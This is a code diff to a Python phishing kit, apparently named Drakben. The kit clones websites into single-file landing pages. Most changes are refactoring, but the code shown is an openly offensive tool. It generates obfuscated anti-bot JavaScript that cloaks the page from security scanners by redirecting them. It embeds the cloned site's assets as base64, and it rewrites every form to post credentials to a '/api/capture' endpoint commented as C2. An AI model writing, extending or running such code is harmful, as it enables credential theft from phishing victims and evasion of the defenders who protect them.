@@ -7,7 +7,7 @@ Description: Clones websites and generates weaponized landing pages.
 import logging
 import os
 import base64
-import random
+import secrets
 import string
 from urllib.parse import urljoin
 
@@ -26,6 +26,7 @@ logger = logging.getLogger(__name__)
 # HYPER-MITHRIL ENGINE (2026)
 # =============================================================================
 
+
 class AntiBotEngine:
     """
     Generates evasive JavaScript to filter security scanners and bots.
@@ -37,44 +38,45 @@ class AntiBotEngine:
         Returns obfuscated JavaScript that checks for specialized bot signatures.
         """
         # Obfuscated variable names
-        v_check = "".join(random.choices(string.ascii_letters, k=8))
-        v_bot = "".join(random.choices(string.ascii_letters, k=8))
+        "".join(secrets.choice(string.ascii_letters) for _ in range(8))
+        v_bot = "".join(secrets.choice(string.ascii_letters) for _ in range(8))
 
         script = f"""
         (function() {{
             var {v_bot} = false;
-            
+
             // 1. Headless Browser Check
             if (navigator.webdriver || window._phantom || window.callPhantom) {{ {v_bot} = true; }}
-            
+
             // 2. Resolution Check (Scanners often use 800x600 or 0x0)
             if (window.outerWidth < 100 || window.outerHeight < 100) {{ {v_bot} = true; }}
-            
+
             // 3. Acceleration Check (VMs often lack WebGL)
             try {{
                 var canvas = document.createElement('canvas');
                 var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (!gl) {{ {v_bot} = true; }}
             }} catch(e) {{}}
-            
+
             // 4. Linguistics Check (Bots often set empty languages)
             if (!navigator.languages || navigator.languages.length === 0) {{ {v_bot} = true; }}
-            
+
             if ({v_bot}) {{
                 // Cloak: Redirect to benign site
                 window.location.href = "https://www.google.com";
                 return;
             }}
-            
+
             console.log("Human verification passed.");
         }})();
         """
         return script
 
+
 class ShadowCloner:
     """
     Creates high-fidelity 'Single-File' phishing snapshots.
-    Embeds critical assets (CSS/Images) directly into HTML (Base64) to prevent 
+    Embeds critical assets (CSS/Images) directly into HTML (Base64) to prevent
     broken UI when viewed offline or on restricted networks.
     """
 
@@ -108,16 +110,19 @@ class ShadowCloner:
             resp = requests.get(url, timeout=5, verify=False)
             if resp.status_code == 200:
                 ct = resp.headers.get("Content-Type", "image/png")
-                encoded = base64.b64encode(resp.content).decode('utf-8')
+                encoded = base64.b64encode(resp.content).decode("utf-8")
                 return f"data:{ct};base64,{encoded}"
-        except: pass
+        except Exception as e:
+            logger.debug(f"Failed to fetch image: {e}")
         return ""
 
     def _fetch_text(self, url: str) -> str:
         try:
             resp = requests.get(url, timeout=5, verify=False)
             return resp.text if resp.status_code == 200 else ""
-        except: return ""
+        except Exception:
+            return ""
+
 
 class PhishingGenerator:
     """
@@ -146,7 +151,9 @@ class PhishingGenerator:
             headers = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             }
-            response = requests.get(url, headers=headers, timeout=15, verify=False) # Skip SSL for attack speed
+            response = requests.get(
+                url, headers=headers, timeout=15, verify=False
+            )  # Skip SSL for attack speed
 
             if response.status_code != 200:
                 logger.error(f"Failed to fetch site: {response.status_code}")
@@ -156,11 +163,15 @@ class PhishingGenerator:
 
             # 1. Weaponize Forms
             for form in soup.find_all("form"):
-                form["action"] = "/api/capture" # Drakben C2 Endpoint
+                form["action"] = "/api/capture"  # Drakben C2 Endpoint
                 form["method"] = "POST"
                 # Add hidden tracking ID
-                req_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
-                input_tag = soup.new_tag("input", type="hidden", name="req_id", value=req_id)
+                req_id = "".join(
+                    secrets.choice(string.ascii_uppercase + string.digits) for _ in range(16)
+                )
+                input_tag = soup.new_tag(
+                    "input", type="hidden", name="req_id", value=req_id
+                )
                 form.append(input_tag)
 
             # 2. Shadow Clone (Embed Assets)
